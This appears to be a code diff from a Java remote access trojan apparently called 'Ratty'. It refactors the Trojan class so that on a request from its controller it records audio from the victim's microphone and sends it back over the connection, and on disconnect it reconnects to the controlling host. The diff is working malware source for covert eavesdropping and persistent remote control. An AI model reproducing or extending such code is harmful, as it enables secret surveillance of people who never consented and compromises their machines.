@@ -6,43 +6,42 @@ import de.sogomn.rat.util.VoiceRecorder;
 
 public final class Trojan implements IConnectionObserver {
 	
-	private VoiceRecorder voiceRecorder;
-	
 	private static final int VOICE_BUFFER_SIZE = 1024 << 6;
 	
 	public Trojan() {
-		voiceRecorder = new VoiceRecorder(VOICE_BUFFER_SIZE);
+		//...
+	}
+	
+	private void handleVoiceRequest(final ActiveConnection connection) {
+		final VoiceRecorder voiceRecorder = new VoiceRecorder(VOICE_BUFFER_SIZE);
 		
+		voiceRecorder.setObserver(recorder -> {
+			final byte[] data = recorder.getLastRecord();
+			final VoicePacket packet = new VoicePacket(data);
+			
+			recorder.stop();
+			connection.addPacket(packet);
+		});
 		voiceRecorder.start();
 	}
 	
-	private void handleVoicePacket(final VoicePacket packet) {
-		final byte[] data = voiceRecorder.getLastRecord();
-		
-		packet.setData(data);
-	}
-	
 	@Override
-	public void packetReceived(final ActiveConnection client, final IPacket packet) {
+	public void packetReceived(final ActiveConnection connection, final IPacket packet) {
 		final Class<? extends IPacket> clazz = packet.getClass();
 		
 		if (clazz == VoicePacket.class) {
-			final VoicePacket voice = (VoicePacket)packet;
-			
-			handleVoicePacket(voice);
+			handleVoiceRequest(connection);
+		} else {
+			packet.execute(connection);
 		}
-		
-		packet.execute(client);
 	}
 	
 	@Override
-	public void disconnected(final ActiveConnection client) {
-		final String address = client.getAddress();
-		final int port = client.getPort();
+	public void disconnected(final ActiveConnection connection) {
+		final String address = connection.getAddress();
+		final int port = connection.getPort();
 		
-		voiceRecorder.stop();
-		
-		client.setObserver(null);
+		connection.setObserver(null);
 		
 		Ratty.connectToHost(address, port);
 	}
